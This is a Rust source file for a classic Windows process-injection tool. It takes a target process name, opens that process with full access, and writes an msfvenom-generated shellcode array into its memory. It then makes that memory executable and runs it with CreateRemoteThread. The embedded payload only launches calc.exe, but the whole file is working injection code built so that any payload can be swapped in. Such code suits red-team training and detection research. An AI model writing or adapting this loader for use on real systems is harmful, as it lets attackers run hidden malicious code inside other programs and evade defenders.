use std::env::args;
use std::ptr::{null, null_mut};
use sysinfo::System;
use windows_sys::Win32::{
    Foundation::{CloseHandle, GetLastError,  HANDLE, FALSE},
    System::{
        Diagnostics::{
            Debug::{WriteProcessMemory},
        },
        Memory::{VirtualAllocEx, VirtualProtectEx, MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE_READ},
        Threading::{OpenProcess, CreateRemoteThread, WaitForSingleObject, INFINITE, PROCESS_ALL_ACCESS},
        }
    };

fn main() {

    // msfvenom -p windows/x64/exec cmd=calc.exe -f rust
    let buf: [u8; 276] = [0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,
    0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,
    0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,
    0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,
    0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,
    0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,
    0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,
    0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,
    0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,
    0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,
    0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,
    0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,
    0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,
    0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,
    0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,
    0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,
    0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,
    0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,
    0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,
    0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,
    0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,
    0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,
    0x2e,0x65,0x78,0x65,0x00];

    let args : Vec<String> = args().collect();

    if args.len() < 2{

        println!("{:<40}{:>40}", "PROCESS NAME","PID");

        let process_list = process_list();
        
        for (pid, process) in process_list.processes() {
            println!("{:<40} {:>40}", process.name(), pid);
        }

        println!("[ ! ] How to use: processinjection.exe <process name>");

        std::process::exit(0);
    }

    unsafe {
        let h_process =  open_process(args);

        // Memory Allocation
        let shellcode_size = buf.len();

        let p_address = VirtualAllocEx(
            h_process, // Process Handle
            null(), 
            shellcode_size, // Payload size
            MEM_COMMIT | MEM_RESERVE, // Allocation Type
            PAGE_READWRITE // Memory protection
        );

        if p_address.is_null() {
            println!("[ ! ] VirtualAllocEx Failed With Error : {}", GetLastError());
            std::process::exit(0);
        }

        println!("[ + ] Memory Allocated at : {:p} payload size {}", p_address, shellcode_size);

        // Write shellcode

        let mut bytes_written : usize = 0;

        if WriteProcessMemory(
            h_process, 
            p_address, 
            buf.as_ptr().cast(), 
            shellcode_size, 
            &mut bytes_written
        ) == 0 || bytes_written != shellcode_size {

            println!("[ + ] WriteProcessMemory Failed With Error: {}", GetLastError());
            std::process::exit(0);

        }

        // Change Memory Protectin to PAGE_EXECUTE_READ
        let mut old_protection = 0;
        VirtualProtectEx(
            h_process, 
            p_address, 
            shellcode_size, 
            PAGE_EXECUTE_READ, 
            &mut old_protection);

        // Create Thread inside process to execute shellcode
        let h_thread = CreateRemoteThread(
            h_process, 
            null(),
             0, 
             std::mem::transmute(p_address), 
             null_mut(), 
             0, 
             null_mut());
        
        println!("[ + ] Bye");
        
        WaitForSingleObject(h_thread, INFINITE);

        CloseHandle(h_thread);
        CloseHandle(h_process);
    }

}

fn process_list() -> System {
    let mut system = System::new_all();
    system.refresh_all();
    system
}

fn open_process(args : Vec<String>) -> HANDLE {
    // Enumerating process
    let mut process = process_list();
    process.refresh_all();

    // Getting args
    let args: Vec<String> = args;

    let target_process = &args[1];


    let mut process_pid = 0;

    for (_pid,process ) in process.processes() {
        if process.name().to_lowercase().to_string() == target_process.to_lowercase().to_string(){
            process_pid = process.pid().into();
            println!("[ + ] Process Found: {} PID {}", process.name(), process.pid());
            break
        }
    }

    if process_pid == 0 {
        println!("[ ! ] Process {} not found, exiting.", target_process);
        std::process::exit(0);
    }

    unsafe {
        // Get Proccess Handle
        let h_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, process_pid as u32);

        h_process
    }
}